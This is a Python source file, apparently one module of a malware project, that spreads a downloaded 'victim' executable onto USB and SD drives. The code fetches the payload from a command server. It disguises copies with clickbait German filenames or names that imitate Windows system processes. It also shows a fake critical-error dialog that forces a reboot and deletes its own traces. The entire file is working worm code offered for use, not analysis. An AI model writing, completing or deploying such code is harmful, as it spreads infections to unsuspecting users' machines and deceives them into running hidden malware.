"""
USB/SD Card Auto-Propagation Module
Automatically duplicates the victim executable to connected USB/SD drives
and handles propagation from USB back to system
"""

import os
import sys
import time
import tempfile
import shutil
import ctypes
import string
import random
import subprocess
import psutil
import threading
from pathlib import Path

import config  # type: ignore
import requests

# Globale Variablen
previously_seen_drives = set()
usb_propagation_lock = threading.Lock()
_cached_server_exe_path = None
recently_copied_drives = set()


def download_server_executable():
    """Try to download the current EXE from the server and cache it locally."""
    global _cached_server_exe_path
    try:
        download_url = f"{config.SERVER_URL}/download/main.exe"
        params = {}
        token = getattr(config, 'SERVER_DOWNLOAD_TOKEN', '') or getattr(config, 'PASSWORD', '')
        if token:
            params['token'] = token

        print(f"[*] [usb_propagation] Downloading server executable from {download_url}", flush=True)
        headers = {}
        if token:
            headers['Authorization'] = token

        response = requests.get(download_url, params=params, headers=headers, timeout=30)
        if response.status_code == 200 and response.content:
            temp_dir = tempfile.gettempdir()
            target_path = os.path.join(temp_dir, 'xvictim_server_main.exe')
            with open(target_path, 'wb') as f:
                f.write(response.content)
            _cached_server_exe_path = target_path
            print(f"[+] [usb_propagation] Server executable downloaded to {target_path}", flush=True)
            return target_path

        print(f"[-] [usb_propagation] Server executable download failed: HTTP {response.status_code}", flush=True)
    except Exception as e:
        print(f"[!] [usb_propagation] Server executable download error: {e}", flush=True)
    return None


def get_server_executable_path():
    """Return a cached server executable path or download it if needed."""
    global _cached_server_exe_path
    if _cached_server_exe_path and os.path.exists(_cached_server_exe_path):
        return _cached_server_exe_path
    return download_server_executable()


def get_executable_to_copy(default_exe_path: str) -> str:
    """Prefer the server-downloaded EXE for USB copying, otherwise fall back to a local executable or script."""
    server_exe = get_server_executable_path()
    if server_exe and os.path.exists(server_exe):
        return server_exe

    local_main = os.path.join(os.path.dirname(__file__), 'main.exe')
    if os.path.exists(local_main):
        return local_main

    if default_exe_path and os.path.exists(default_exe_path):
        return default_exe_path

    print(f"[-] [usb_propagation] No valid executable available for USB copy", flush=True)
    return None


def get_random_filename_from_usb(usb_root: str) -> str:
    """
    Scan USB drive and get a random filename from existing files,
    then rename exe to match that name (but with .exe extension)
    """
    try:
        potential_names = []
        
        # Scan USB root directory for files
        if os.path.exists(usb_root):
            for item in os.listdir(usb_root):
                if item.startswith('.'):
                    continue  # Skip hidden files
                
                item_path = os.path.join(usb_root, item)
                
                # Only look at files, not directories
                if os.path.isfile(item_path):
                    # Get filename without extension
                    name_without_ext = os.path.splitext(item)[0]
                    
                    # Skip very short names
                    if len(name_without_ext) > 2:
                        potential_names.append(name_without_ext)
        
        # If we found filenames, pick a random one
        if potential_names:
            chosen_name = random.choice(potential_names)
            suspicious_names = {
                "desktop",
                "documents",
                "downloads",
                "system",
                "servicehost",
                "explorer",
                "hostprocess",
                "readme",
                "setup",
                "update",
                "autorun",
                "new folder"
            }
            if chosen_name.lower() in suspicious_names or len(chosen_name) < 4:
                chosen_name = get_clickbait_filename().replace('.exe', '')
            filename = f"{chosen_name}.exe"
            print(f"[+] [usb_propagation] Using USB filename: {filename}", flush=True)
            return filename
        else:
            # Fallback to clickbait names if no files on USB
            print(f"[*] [usb_propagation] No files found on USB, using clickbait fallback names", flush=True)
            return get_clickbait_filename()
    
    except Exception as e:
        print(f"[!] [usb_propagation] Error getting filename from USB: {e}", flush=True)
        # Fallback
        innocent_names = [
            "SystemUpdate",
            "RuntimeBroker",
            "WindowsDefender",
        ]
        chosen_name = random.choice(innocent_names)
        random_suffix = ''.join(random.choices(string.digits, k=4))
        return f"{chosen_name}{random_suffix}.exe"


def get_clickbait_filename() -> str:
    """Generate a clickable, attractive filename for USB propagation."""
    clickbait_names = [
        "katzenbild",
        "urlaubsfoto",
        "geburtstagsfoto",
        "geheimesvideo",
        "liebesschreiben",
        "rechnungen",
        "sommerurlaub",
        "familienfoto",
        "privatvideo",
        "projektplan",
        "wichtiges_dokument",
        "passwortliste",
        "instagram_story",
        "tiktok_video",
        "urlaub2026",
        "memo2026",
    ]
    base_name = random.choice(clickbait_names)
    random_suffix = ''.join(random.choices(string.digits, k=2))
    return f"{base_name}{random_suffix}.exe"


def get_random_filename(original_name: str = "System Update.exe") -> str:
    """Generate random filename that looks innocent"""
    # List of innocent-looking Windows filenames
    innocent_names = [
        "SystemUpdate",
        "RuntimeBroker",
        "WindowsDefender",
        "ServiceHost",
        "Explorer",
        "HostProcess",
        "svchost",
        "taskhosts",
        "ctfmon",
        "dwm",
        "nvidia",
        "amd",
        "intel",
    ]
    
    chosen_name = random.choice(innocent_names)
    random_suffix = ''.join(random.choices(string.digits, k=4))
    return f"{chosen_name}{random_suffix}.exe"


def get_current_executable_path() -> str:
    """Get the path of the currently running executable"""
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        return sys.executable
    else:
        # Running as Python script
        return os.path.abspath(sys.argv[0])


def get_system_drives() -> set:
    """Get all available drives (Local + USB/SD)"""
    drives = set()
    
    if sys.platform == "win32":
        # Check all drive letters A-Z
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            try:
                if os.path.exists(drive):
                    drives.add(letter.upper())
            except Exception:
                pass
    
    return drives


def is_usb_or_removable_drive(drive_letter: str) -> bool:
    """Check if drive is USB/SD (removable) vs local"""
    if sys.platform != "win32":
        return False
    
    # Exclude C drive (local)
    if drive_letter.upper() == 'C':
        return False
    
    # Check via WMI if possible
    try:
        import wmi
        c = wmi.WMI()
        for disk in c.Win32_LogicalDisk():
            if disk.Name.startswith(drive_letter):
                # DriveType: 2 = Removable, 3 = Local, 4 = Network
                drive_type = disk.DriveType
                return drive_type == 2  # Removable drive
    except Exception:
        pass
    
    # Fallback: non-C drives are likely USB/SD
    return True


def check_process_already_running(exe_name: str) -> bool:
    """Check if a process with the same executable name is already running"""
    try:
        current_pid = os.getpid()
        current_exe = get_current_executable_path().lower()
        
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if proc.info['pid'] == current_pid:
                    continue  # Skip own process
                
                proc_exe = proc.info.get('exe', '').lower() if proc.info.get('exe') else ''
                
                # Check if it's the same executable running from different location
                if proc_exe and current_exe.endswith('.exe'):
                    # Compare just the executable name
                    current_name = os.path.basename(current_exe)
                    proc_name = os.path.basename(proc_exe)
                    
                    if current_name == proc_name:
                        # Same executable name, might be duplicate
                        # More detailed check: compare actual executable hashes would be ideal
                        # but for now, check if it's from a different path
                        if not proc_exe.startswith(os.path.dirname(current_exe)):
                            return True
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
    except Exception as e:
        print(f"[!] [usb_propagation.check_process_already_running] Error: {e}", flush=True)
    
    return False


def show_error_dialog():
    """Show critical error dialog and restart system"""
    try:
        # Create error message window
        error_message = (
            "A critical system process has encountered an error.\n\n"
            "The system must restart to recover.\n\n"
            "Click OK to restart now."
        )
        
        # Use ctypes for Windows message box
        result = ctypes.windll.user32.MessageBoxW(
            None,
            error_message,
            "Critical Process Error",
            0x10  # MB_ICONHAND (stop/critical icon)
        )
        
        print("[*] [usb_propagation] User clicked error dialog, initiating system restart...", flush=True)
        
        # Schedule system restart
        subprocess.run(
            ["shutdown", "/r", "/t", "5", "/c", "System restart required for critical update"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        return True
    except Exception as e:
        print(f"[!] [usb_propagation] Error showing dialog: {e}", flush=True)
        return False


def cleanup_usb_file(file_path: str):
    """Remove the executable from USB after successful propagation"""
    try:
        if os.path.exists(file_path):
            # Wait a moment before deletion
            time.sleep(2)
            os.remove(file_path)
            print(f"[+] [usb_propagation] Cleaned up USB file: {file_path}", flush=True)
    except Exception as e:
        print(f"[!] [usb_propagation] Failed to cleanup USB file {file_path}: {e}", flush=True)


def copy_to_usb_drive(usb_drive_letter: str, exe_path: str) -> bool:
    """Copy the current executable to USB drive with filename from existing USB files"""
    try:
        with usb_propagation_lock:
            usb_root = f"{usb_drive_letter}:\\"
            
            if not os.path.exists(usb_root):
                print(f"[!] [usb_propagation] USB drive {usb_drive_letter}: no longer available", flush=True)
                return False
            
            # Generate filename based on existing files on USB
            random_name = get_random_filename_from_usb(usb_root)
            target_path = os.path.join(usb_root, random_name)
            
            # Check if we already copied to this drive during this runtime
            if usb_drive_letter in recently_copied_drives:
                print(f"[*] [usb_propagation] Already copied to {usb_drive_letter}: recently in this session, skip", flush=True)
                return False

            source_exe_path = get_executable_to_copy(exe_path)
            if not source_exe_path or not os.path.exists(source_exe_path):
                print(f"[!] [usb_propagation] No valid executable available to copy to USB {usb_drive_letter}:", flush=True)
                return False

            # Try to copy the executable
            try:
                # Copy file to USB
                shutil.copy2(source_exe_path, target_path)
                print(f"[+] [usb_propagation] Successfully copied to USB {usb_drive_letter}: as {random_name}", flush=True)
                recently_copied_drives.add(usb_drive_letter)
                return True
            except Exception as e:
                print(f"[!] [usb_propagation] Failed to copy to {usb_drive_letter}: {e}", flush=True)
                return False
    
    except Exception as e:
        print(f"[!] [usb_propagation] Error in copy_to_usb_drive: {e}", flush=True)
        return False


def handle_usb_infection(usb_file_path: str) -> bool:
    """
    Handle when USB executable is executed (infection from USB back to system)
    - Check if already running on system
    - If yes: show error dialog and restart
    - If no: propagate to system
    """
    try:
        current_exe = get_current_executable_path()
        
        print(f"[*] [usb_propagation] USB infection detected from: {usb_file_path}", flush=True)
        
        # Check if we're already running on the system
        if check_process_already_running(os.path.basename(current_exe)):
            print(f"[!] [usb_propagation] Already running on system - showing error dialog and restart", flush=True)
            
            # Show error dialog and trigger restart
            if show_error_dialog():
                # Cleanup USB file after restart is scheduled
                threading.Thread(
                    target=lambda: cleanup_usb_file(usb_file_path),
                    daemon=True
                ).start()
                return True
        else:
            # Not running yet, do nothing - normal execution will handle it
            print(f"[*] [usb_propagation] Not yet running on system, normal execution continues", flush=True)
            return True
    
    except Exception as e:
        print(f"[!] [usb_propagation] Error in handle_usb_infection: {e}", flush=True)
        return False


def usb_monitor_worker():
    """Monitor for new USB/SD drives and propagate the virus"""
    global previously_seen_drives
    
    print("[*] [usb_propagation] USB Monitor Thread started", flush=True)
    time.sleep(5)  # Wait for system startup
    
    current_exe = get_current_executable_path()
    print(f"[*] [usb_propagation] Current executable: {current_exe}", flush=True)
    
    propagation_count = 0
    
    while True:
        try:
            # Get current drives
            current_drives = get_system_drives()
            
            # Find new drives
            new_drives = current_drives - previously_seen_drives
            
            if new_drives:
                print(f"[+] [usb_propagation] Detected new drives: {new_drives}", flush=True)
                
                # Propagate to each new drive
                for drive_letter in new_drives:
                    if is_usb_or_removable_drive(drive_letter):
                        print(f"[*] [usb_propagation] Detected removable drive: {drive_letter}:", flush=True)
                        
                        if copy_to_usb_drive(drive_letter, current_exe):
                            propagation_count += 1
                            print(f"[+] [usb_propagation] Propagation count: {propagation_count}", flush=True)
            
            # Check for removed drives
            removed_drives = previously_seen_drives - current_drives
            if removed_drives:
                print(f"[*] [usb_propagation] Removed drives: {removed_drives}", flush=True)
            
            # Update seen drives
            previously_seen_drives = current_drives.copy()
            
            # Check every 5 seconds for new USB drives
            time.sleep(5)
        
        except Exception as e:
            print(f"[!] [usb_propagation] Error in usb_monitor_worker: {e}", flush=True)
            time.sleep(5)


def main():
    """Start USB propagation worker thread"""
    print("[*] [usb_propagation] Starting USB Auto-Propagation module...", flush=True)
    
    # Check if we were launched from USB (self-infection attempt)
    try:
        current_exe = get_current_executable_path()
        if len(current_exe) > 2 and current_exe[0].upper() not in ['C', 'D']:
            # Possibly running from USB
            print(f"[*] [usb_propagation] Possibly running from removable drive: {current_exe}", flush=True)
            handle_usb_infection(current_exe)
    except Exception as e:
        print(f"[!] [usb_propagation] Error checking infection status: {e}", flush=True)
    
    # Start monitoring for new USB drives
    monitoring_thread = threading.Thread(
        target=usb_monitor_worker,
        daemon=True
    )
    monitoring_thread.start()
    print("[+] [usb_propagation] USB Monitor thread started", flush=True)


if __name__ == "__main__":
    main()
